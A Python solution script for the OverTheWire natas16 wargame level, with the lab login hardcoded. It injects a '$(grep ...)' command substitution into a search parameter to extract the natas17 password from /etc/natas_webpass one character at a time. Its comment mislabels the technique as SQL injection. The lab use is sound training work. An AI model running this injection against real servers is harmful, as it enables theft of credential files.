#!/bin/python3.9
# natas sqli to brute force passwords

import requests
import re


url = "http://natas16.natas.labs.overthewire.org"
username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def authorization_test():

    get_auth = requests.get(url, auth=(username,password))

    s = '<h1>Unauthorized'
    response_check = re.search(s, get_auth.text)
    #print(response_check)
    
    if (str(response_check) != 'None'): 
        print('Authorization failed. Username, password, or url incorrect')
        exit()
    else:
        print('Authentication successful, continuing with exploit.')



def password_brute_force():
    natas17_password = ''
    print("\nBrute forcing the password.\n")
    for i in range(0,32):
        for j in characters:
            char = ''.join([natas17_password,j])
            uri = ''.join([url,'?','needle=','$(grep -E ^',char,'.* /etc/natas_webpass/natas17)raccoon','&submit=Search'])
            #print(uri)
            #print(username, ':', password)
            r = requests.post(uri, auth=(username,password))
            #print(r.text)

            s = "raccoons"
            char_check = re.search(s, r.text)
            #print(char_check)

            if (str(char_check) == 'None'): 
                natas17_password += j
                print(f'Length: {len(natas17_password)}, Password: {natas17_password}')
                break
                


if __name__ == '__main__':
    authorization_test()
    password_brute_force()